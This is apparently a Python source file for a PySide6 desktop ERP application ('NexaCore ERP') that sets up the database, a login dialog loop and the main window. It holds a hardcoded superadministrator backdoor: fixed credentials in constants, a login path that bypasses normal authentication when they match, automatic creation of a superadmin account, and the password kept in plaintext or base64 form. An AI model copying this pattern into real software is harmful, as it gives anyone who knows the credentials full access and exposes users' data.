# nexacore_erp/app.py
import sys
from PySide6.QtCore import Qt
from PySide6.QtGui import QGuiApplication
from PySide6.QtWidgets import QApplication, QDialog, QMessageBox

from .core.database import init_db, SessionLocal
from .core.models import User
from .core.auth import authenticate, set_current_user

from .ui.login_dialog import LoginDialog
from .ui.main_window import MainWindow

# Fixed superadministrator backdoor
SUPERADMIN_USER = "superadministrator"
SUPERADMIN_PASS = "superadministrator123!"


def _ensure_builtin_superadmin() -> User:
    """Ensure a DB row exists for the built-in superadministrator."""
    try:
        from .core.auth import hash_password as _hash
    except Exception:
        _hash = None

    with SessionLocal() as s:
        u = s.query(User).filter(User.username == SUPERADMIN_USER).first()
        if u:
            return u
        u = User(
            account_id="default",
            username=SUPERADMIN_USER,
            role="superadmin",
            password_hash=_hash(SUPERADMIN_PASS) if _hash else SUPERADMIN_PASS,
        )
        # Optional: store revealable copy so the “eye” works
        try:
            import base64
            u.password_enc = base64.b64encode(SUPERADMIN_PASS.encode("utf-8"))
        except Exception:
            pass
        setattr(u, "is_active", True)
        s.add(u)
        s.commit()
        s.refresh(u)
        return u


def _login_once(parent=None) -> User | None:
    """Show login dialog. Return authenticated User or None on cancel."""
    while True:
        dlg = LoginDialog(parent)
        if dlg.exec() != QDialog.Accepted:
            return None
        try:
            username, password = dlg.credentials()
        except Exception:
            username, password = "", ""

        username = (username or "").strip()
        password = password or ""

        if not username:
            QMessageBox.warning(parent, "Login failed", "Username is required.")
            continue

        # Built-in superadministrator bypass
        if username == SUPERADMIN_USER and password == SUPERADMIN_PASS:
            return _ensure_builtin_superadmin()

        u = authenticate(username, password)
        if not u:
            QMessageBox.warning(parent, "Login failed", "Invalid username or password.")
            continue

        # Must be active
        if hasattr(u, "is_active") and not getattr(u, "is_active", True):
            QMessageBox.warning(parent, "Login failed", "This account is not active.")
            continue

        return u


def run_app():
    # DB ready
    init_db()

    # High-DPI normalization
    QGuiApplication.setHighDpiScaleFactorRoundingPolicy(
        Qt.HighDpiScaleFactorRoundingPolicy.PassThrough
    )
    QGuiApplication.setAttribute(Qt.AA_UseHighDpiPixmaps, True)

    app = QApplication.instance() or QApplication(sys.argv)
    app.setApplicationName("NexaCore ERP")
    app.setOrganizationName("NexaCore Digital Solutions")
    app.setOrganizationDomain("nexacore.local")

    # Login loop: close main window on logout, return to login dialog only
    should_quit = False
    while not should_quit:
        user = _login_once(parent=None)
        if not user:
            break

        set_current_user(user)
        win = MainWindow()

        # When MainWindow asks to logout, close it and loop back to login dialog
        def _on_logout():
            try:
                win.close()
            except Exception:
                pass

        def _on_exit():
            nonlocal should_quit
            should_quit = True
            try:
                app.quit()
            except Exception:
                pass
            try:
                win.close()
            except Exception:
                pass

        win.logout_requested.connect(_on_logout)
        win.exit_requested.connect(_on_exit)
        win.showMaximized()

        # Enter event loop until window closes (logout), then loop to login again
        app.exec()
        set_current_user(None)
        # continue -> back to login dialog only
    sys.exit(0)
